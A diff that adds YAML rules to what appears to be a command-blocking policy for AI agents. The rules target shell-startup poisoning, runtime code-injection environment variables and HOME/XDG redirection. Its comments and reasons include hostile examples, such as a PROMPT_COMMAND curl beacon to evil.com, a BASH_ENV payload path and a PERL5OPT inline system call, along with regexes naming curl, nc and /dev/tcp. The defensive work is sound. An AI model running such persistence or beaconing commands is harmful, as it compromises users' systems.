@@ -2578,3 +2578,192 @@ rules:
     decision: "BLOCK"
     confidence: 0.88
     reason: "Brace expansion result stored in a variable and then executed — two-stage command construction that first assembles the payload, then runs it. Evades single-pass detection. MITRE T1027.004."
+
+  # =========================================================================
+  # Shell Startup Environment Poisoning (BASH_ENV, ENV, PROMPT_COMMAND)
+  # =========================================================================
+  #
+  # These environment variables cause the shell to execute arbitrary code
+  # automatically, without the user or agent explicitly running anything:
+  #
+  #   BASH_ENV    — Bash sources this file before every non-interactive
+  #                 shell invocation (bash -c "...", scripts, subshells).
+  #                 Setting BASH_ENV=/tmp/evil.sh means every subsequent
+  #                 `bash -c` will silently execute the payload first.
+  #
+  #   ENV         — POSIX sh equivalent of BASH_ENV. Sourced by sh/dash
+  #                 before non-interactive invocations.
+  #
+  #   PROMPT_COMMAND — Bash executes this string as a command before
+  #                    displaying each primary prompt. Perfect for persistent
+  #                    beaconing: export PROMPT_COMMAND='curl evil.com/beacon'
+  #                    fires on every Enter keystroke in the shell.
+  #
+  # These are distinct from PATH/LD_PRELOAD poisoning (already covered):
+  # PATH/LD_PRELOAD redirect which binaries are loaded, while BASH_ENV/
+  # PROMPT_COMMAND inject *execution* into the shell lifecycle itself.
+  #
+  # Taxonomy: persistence-evasion/shell-init/shell-env-poisoning
+  # OWASP LLM06 (Excessive Agency), LLM08 (Insecure Plugin)
+  # MITRE T1546.004 — Event Triggered Execution: Unix Shell Configuration
+  # CWE-426 — Untrusted Search Path (startup file variant)
+  # =========================================================================
+
+  # --- BLOCK: export BASH_ENV or ENV to arbitrary file ---
+  - id: "ts-block-shell-env-startup-export"
+    taxonomy: "persistence-evasion/shell-init/shell-env-poisoning"
+    match:
+      command_regex: "export\\s+(BASH_ENV|ENV)="
+    decision: "BLOCK"
+    confidence: 0.95
+    reason: "Exporting BASH_ENV or ENV causes bash/sh to source the specified file before every non-interactive shell invocation — silently injecting code into all subshells, scripts, and command substitutions. MITRE T1546.004."
+
+  # --- BLOCK: inline BASH_ENV=... before a command ---
+  - id: "ts-block-shell-env-startup-inline"
+    taxonomy: "persistence-evasion/shell-init/shell-env-poisoning"
+    match:
+      command_regex: "\\b(BASH_ENV|ENV)=[^\\s]+\\s+\\S"
+    decision: "BLOCK"
+    confidence: 0.93
+    reason: "Inline BASH_ENV/ENV assignment before a command (e.g., BASH_ENV=/tmp/evil.sh bash -c '...') injects arbitrary code execution into the target shell invocation. MITRE T1546.004."
+
+  # --- BLOCK: export PROMPT_COMMAND ---
+  - id: "ts-block-prompt-command-export"
+    taxonomy: "persistence-evasion/shell-init/shell-env-poisoning"
+    match:
+      command_regex: "export\\s+PROMPT_COMMAND="
+    decision: "BLOCK"
+    confidence: 0.95
+    reason: "Exporting PROMPT_COMMAND causes bash to execute the value as a command before every prompt display — ideal for persistent beaconing, credential harvesting, or keylogging. Fires on every Enter keystroke. MITRE T1546.004."
+
+  # --- BLOCK: PROMPT_COMMAND assignment (non-export, still dangerous in current shell) ---
+  - id: "ts-block-prompt-command-assign"
+    taxonomy: "persistence-evasion/shell-init/shell-env-poisoning"
+    match:
+      command_regex: "PROMPT_COMMAND=['\"].*\\b(curl|wget|nc|bash|sh|python|perl|ruby|eval|exec|/dev/tcp)"
+    decision: "BLOCK"
+    confidence: 0.92
+    reason: "Setting PROMPT_COMMAND to a value containing a network or execution command installs a persistent hook that fires before every prompt. Even without export, it persists in the current shell session. MITRE T1546.004."
+
+  # =========================================================================
+  # Language Runtime Code Injection via Environment Variables
+  # =========================================================================
+  #
+  # Unlike search path poisoning (PYTHONPATH, NODE_PATH — already covered),
+  # these env vars inject CODE EXECUTION directly into every runtime
+  # invocation. They are more dangerous because:
+  #
+  #   1. No attacker-controlled directory is needed on the filesystem
+  #      (for PERL5OPT, code runs inline)
+  #   2. They affect ALL invocations of the runtime, not just import resolution
+  #   3. They're rarely monitored by security tools
+  #
+  #   PYTHONSTARTUP   — Python sources this file at interactive startup.
+  #                     But also: python -c uses it. Persistent code injection.
+  #
+  #   PERL5OPT        — Perl treats this as command-line options. Supports
+  #                     -e for inline code: PERL5OPT='-e system("id")'
+  #                     runs arbitrary code in every perl invocation.
+  #
+  #   RUBYOPT         — Ruby treats this as command-line options. Supports
+  #                     -r to require files: RUBYOPT=-r/tmp/evil
+  #                     loads attacker code in every ruby invocation.
+  #
+  #   NODE_OPTIONS    — Node.js processes these as CLI flags. Supports
+  #                     --require: NODE_OPTIONS='--require /tmp/evil.js'
+  #                     loads attacker module in every node invocation.
+  #
+  #   JAVA_TOOL_OPTIONS — JVM reads this before any Java application starts.
+  #                       -javaagent:/tmp/evil.jar injects a Java agent into
+  #                       every JVM process. Used in real supply chain attacks.
+  #
+  # Taxonomy: privilege-escalation/command-execution/env-injection
+  # OWASP LLM06 (Excessive Agency)
+  # MITRE T1574.007 — Hijack Execution Flow: Path Interception by PATH
+  #                    Environment Variable (generalized to runtime env vars)
+  # CWE-426 — Untrusted Search Path
+  # =========================================================================
+
+  # --- BLOCK: Runtime code injection env vars with export ---
+  - id: "ts-block-runtime-code-inject-export"
+    taxonomy: "privilege-escalation/command-execution/env-injection"
+    match:
+      command_regex: "export\\s+(PYTHONSTARTUP|PERL5OPT|RUBYOPT|NODE_OPTIONS|JAVA_TOOL_OPTIONS)="
+    decision: "BLOCK"
+    confidence: 0.95
+    reason: "Exporting a runtime code injection env var (PYTHONSTARTUP, PERL5OPT, RUBYOPT, NODE_OPTIONS, JAVA_TOOL_OPTIONS) silently injects code into every subsequent invocation of that language runtime. Unlike search path vars, these execute code directly. MITRE T1574.007."
+
+  # --- BLOCK: Inline runtime code injection before command ---
+  - id: "ts-block-runtime-code-inject-inline"
+    taxonomy: "privilege-escalation/command-execution/env-injection"
+    match:
+      command_regex: "(PYTHONSTARTUP|PERL5OPT|RUBYOPT|NODE_OPTIONS|JAVA_TOOL_OPTIONS)=[^\\s]+\\s+\\S"
+    decision: "BLOCK"
+    confidence: 0.93
+    reason: "Inline runtime code injection env var before a command — injects attacker code into the target process. Example: PERL5OPT='-e system(\"id\")' perl script.pl executes arbitrary code before the script runs. MITRE T1574.007."
+
+  # --- AUDIT: Any PERL5OPT usage (even without export, very rare in legitimate use) ---
+  - id: "ts-audit-perl5opt"
+    taxonomy: "privilege-escalation/command-execution/env-injection"
+    match:
+      command_regex: "PERL5OPT="
+    decision: "AUDIT"
+    confidence: 0.80
+    reason: "PERL5OPT is the most dangerous runtime env var — supports inline code execution via -e flag. Extremely rare in legitimate AI agent workflows. Any use warrants review."
+
+  # =========================================================================
+  # HOME / XDG_CONFIG_HOME Redirection Attacks
+  # =========================================================================
+  #
+  # Redirecting $HOME or $XDG_CONFIG_HOME silently changes where dozens of
+  # tools read their configuration:
+  #
+  #   HOME=/tmp/evil causes:
+  #     - ssh to read ~/.ssh/config, ~/.ssh/known_hosts from /tmp/evil/.ssh/
+  #     - git to read ~/.gitconfig from /tmp/evil/.gitconfig (can include hooks)
+  #     - npm to read ~/.npmrc from /tmp/evil/.npmrc (can set registry to malicious)
+  #     - pip to read ~/.pip/pip.conf (can set index-url to malicious PyPI)
+  #     - gpg to read ~/.gnupg/ from /tmp/evil/.gnupg/ (fake keyring)
+  #     - kubectl to read ~/.kube/config (fake cluster endpoint)
+  #
+  #   XDG_CONFIG_HOME=/tmp/evil causes:
+  #     - git to read $XDG_CONFIG_HOME/git/config (alternative to ~/.gitconfig)
+  #     - pip to read $XDG_CONFIG_HOME/pip/pip.conf
+  #     - Many other XDG-compliant tools
+  #
+  # This is a meta-attack: rather than poisoning one tool, it redirects the
+  # trust anchor that ALL tools use for their config. Combined with a
+  # pre-populated /tmp/evil/ directory, it's a one-shot supply chain attack.
+  #
+  # Taxonomy: privilege-escalation/command-execution/env-injection
+  # OWASP LLM06 (Excessive Agency)
+  # MITRE T1574.007 — Hijack Execution Flow
+  # CWE-426 — Untrusted Search Path
+  # =========================================================================
+
+  # --- BLOCK: HOME redirection to writable/volatile paths ---
+  - id: "ts-block-home-redirect"
+    taxonomy: "privilege-escalation/command-execution/env-injection"
+    match:
+      command_regex: "(export\\s+)?HOME=(/tmp|/dev/shm|/var/tmp|/run/user|\\./|\\.\\./)\\S*"
+    decision: "BLOCK"
+    confidence: 0.93
+    reason: "Redirecting HOME to a writable/volatile path hijacks config lookups for ssh, git, npm, pip, gpg, kubectl, and dozens more tools — a single env var poisons the trust root for all user-space configuration. MITRE T1574.007."
+
+  # --- BLOCK: HOME redirection inline before a command ---
+  - id: "ts-block-home-redirect-inline"
+    taxonomy: "privilege-escalation/command-execution/env-injection"
+    match:
+      command_regex: "HOME=(/tmp|/dev/shm|/var/tmp|/run/user|\\./|\\.\\./)\\S*\\s+(ssh|git|npm|pip|gpg|kubectl|helm|aws|gcloud|terraform|docker|podman)"
+    decision: "BLOCK"
+    confidence: 0.95
+    reason: "Inline HOME redirection before a security-sensitive tool — the tool reads attacker-controlled config (SSH keys, git hooks, npm registry, pip index, cloud credentials). MITRE T1574.007."
+
+  # --- BLOCK: XDG_CONFIG_HOME / XDG_DATA_HOME redirection ---
+  - id: "ts-block-xdg-redirect"
+    taxonomy: "privilege-escalation/command-execution/env-injection"
+    match:
+      command_regex: "(export\\s+)?XDG_(CONFIG|DATA)_HOME=(/tmp|/dev/shm|/var/tmp|/run/user|\\./|\\.\\./)\\S*"
+    decision: "BLOCK"
+    confidence: 0.92
+    reason: "Redirecting XDG_CONFIG_HOME or XDG_DATA_HOME to a writable path hijacks XDG-compliant config lookups for git, pip, and many other tools. Alternative attack vector to HOME redirection. MITRE T1574.007."
